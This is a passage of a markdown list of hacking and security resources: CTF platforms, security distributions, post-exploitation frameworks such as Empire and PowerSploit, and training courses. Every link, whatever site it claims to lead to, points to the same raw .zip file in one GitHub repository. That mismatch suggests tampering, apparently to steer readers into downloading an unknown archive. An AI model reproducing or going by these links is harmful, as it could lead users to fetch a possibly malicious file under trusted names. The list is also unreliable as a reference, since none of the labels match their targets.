 * [https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip CTF](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * [Pliad CTF](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * [RuCTFe](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * [Ghost in the Shellcode](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * [PHD CTF](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * [SECUINSIDE CTF](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * [Codegate CTF](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * [Boston Key Party CTF](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * [ZeroDays CTF](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * [Insomni’hack](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * [Pico CTF](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * [prompt(1) to win](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - XSS Challenges
 * [HackTheBox](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)

## General

 * [Hack+](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - An Intelligent network of bots that fetch the latest InfoSec content.
 * [https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - All about CTF (Capture The Flag)
 * [WeChall](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * [CTF archives (shell-storm)](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)
 * [Rookit Arsenal](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - OS RE and rootkit development
 * [Pentest Cheat Sheets](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - Collection of cheat sheets useful for pentesting
 * [Movies For Hackers](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - A curated list of movies every hacker & cyberpunk must watch.
 * [Roppers CTF Fundamentals Course](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - Free course designed to get a student crushing CTFs as quickly as possible. Teaches the mentality and skills required for crypto, forensics, and more. Full text available as a [gitbook](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip).

# OS

## Online resources

 * [Security related Operating Systems @ Rawsec](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - Complete list of security related operating systems
 * [Best Linux Penetration Testing Distributions @ CyberPunk](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - Description of main penetration testing distributions
 * [Security @ Distrowatch](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - Website dedicated to talking about, reviewing and keeping up to date with open source operating systems


# Post exploitation

## tools
* [empire](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - A post exploitation framework for powershell and python.
* [silenttrinity](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - A post exploitation tool that uses iron python to get past powershell restrictions.
* [PowerSploit](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - A PowerShell post exploitation framework
* [ebowla](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - Framework for Making Environmental Keyed Payloads

# ETC

 * [SecTools](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - Top 125 Network Security Tools
 * [Roppers Security Fundamentals](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - Free course that teaches a beginner how security works in the real world. Learn security theory and execute defensive measures so that you are better prepared against threats online and in the physical world. Full text available as a [gitbook](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip).
 * [Roppers Practical Networking](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - A hands-on, wildly practical introduction to networking and making packets dance. No wasted time, no memorizing, just learning the fundamentals.
 * [Rawsec's CyberSecurity Inventory](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - An open-source inventory of tools, resources, CTF platforms and Operating Systems about CyberSecurity. ([Source](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip))
 * [The Cyberclopaedia](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip) - The open-source encyclopedia of cybersecurity. [GitHub Repository](https://github.com/CHETHAN562/awesome-hacking/raw/refs/heads/master/djehad/hacking-awesome-3.4.zip)